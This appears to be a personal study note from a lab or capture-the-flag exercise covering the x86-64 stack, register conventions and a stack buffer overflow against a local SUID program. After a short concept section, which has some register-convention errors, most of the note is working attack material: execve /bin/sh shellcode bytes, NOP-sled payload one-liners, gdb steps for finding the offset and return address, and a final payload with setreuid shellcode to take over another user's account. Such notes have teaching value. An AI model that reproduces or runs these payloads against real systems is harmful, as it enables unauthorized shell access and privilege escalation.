User stack - Info required to run program. Stack grows downwards
Run time Heap - Dynamically assigned memory

rsp - stack pointer

push - adds value to stack and decrements rsp

pop - reads value and removes from stack by incrementing rsp

Values still remain just no longer part of stack by change in rsp

## Assembly
[[Assembly]]
- Functions are called using callq
- Once the function is finished executing, it will call the return instruction(retq).
	- This instruction will pop the value of the return address of the stack, deallocate the stack frame for the add function, change the instruction pointer to the value of the return address, change the stack pointer(rsp) to the top of the stack and change the frame pointer(rbp) to the stack frame of calc.
- Note: rax is a special register that stores the return values of the functions(if any).   
-   rax is caller saved
-   rdi, rsi, rdx, rcx r8 and r9 are called saved(and they are usually arguments for functions)
-   r10, r11 are caller saved
-   rbx, r12, r13, r14 are callee saved 
-   rbp is also callee saved(and can be optionally used as a frame pointer)
-   rsp is callee saved

## Memory address conversion
Using python
```
import struct
struct.pack('<I', 0x0000000000500567)
```

Using pwntools in python3
```
import pwn
pwn.p32(0x0000000000400567)
```

## Open up a shell

Shell code is 30 long:
```
\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05
```

![[Pasted image 20220601120836.png]]

NOP instruction (No Operation Instruction) \x90
![[Pasted image 20220601121102.png]]

```
python -c “print (NOP * no_of_nops + shellcode + random_data * no_of_random_data + memory address)”
```

Using this format would be something like this for this challenge:  

```
python -c “print('\x90' * 30 + '\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05' + '\x41' * 60 + '\xef\xbe\xad\xde') | ./program_name”
```

### Buffer Overflow Example
The offset will look like this : buffer(140 bytes) + Alignment bytes (?) + rbp (8 bytes).

Find overflow number:
	run $(python -c "print('A' * 140)")
	At 158:
	Program received signal SIGSEGV, Segmentation fault.
	0x0000414141414141 in ?? ()
	At 159:
	Program received signal SIGSEGV, Segmentation fault.
	0x0000000000400563 in copy_arg ()


40 length shell code That has an exit call:

```
\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05
```

90 + 40 + 22 = 152
NOP sled + shell code + JUNK chars

followed by return address 6 chars

Locate required address:
```
run $(python -c "print('\x90' * 90 + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + '\x41' * 22 + 'B'*6)")
```

FIND NOP sled
	x/100x $rsp-200
	Choose a memory address of NOP
	Chose address on NOP slope:
	0x7fffffffe298
	\x98\xe2\xff\xff\xff\x7f

Get the shell:

```
./buffer-overflow $(python -c "print('\x90' * 90 + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + '\x41' * 22 + '\x98\xe2\xff\xff\xff\x7f')")
```

Change SUID to run as other user:
cat /etc/passwd
user2:x:1002:1002::/home/user2:/bin/bash

setuid does not change real uid
need to setreuid()
setreuid(0) for root
setreuid(1002,1002) for user 2

Use pwntools to generate shellcode:
	$pwn shellcraft -f d amd64.linux.setreuid 1002
	(-f d sets format to escaped)

```
\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05
```

Put in front of original payload and recalculate NOP (removed from end to avoid address change)

final payload

```
./buffer-overflow $(python -c "print('\x90' * 90 + '\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + '\x41' * 8 + '\x98\xe2\xff\xff\xff\x7f')")
```